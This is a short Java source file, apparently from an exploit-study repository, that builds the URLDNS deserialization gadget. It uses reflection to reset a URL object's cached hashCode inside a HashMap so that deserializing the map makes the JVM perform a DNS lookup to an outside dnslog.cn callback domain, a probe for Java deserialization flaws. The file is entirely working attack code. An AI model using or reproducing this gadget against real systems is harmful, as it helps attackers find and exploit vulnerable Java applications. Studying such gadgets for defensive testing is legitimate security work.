package com.yyjccc.CommonsExp;

import com.yyjccc.Utils.Tool;

import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
	public static void main(String[] args) throws Exception {
		URL url = new URL("http://h4e3cz.dnslog.cn");
		HashMap<URL, Object> hashMap = new HashMap<>();
		Field field = url.getClass().getDeclaredField("hashCode");
		field.setAccessible(true);
		field.set(url,999);
		hashMap.put(url,"yyjccc");
		field.set(url,-1);
		//Tool.serialize(hashMap);
		Tool.unserialize();
	}
}
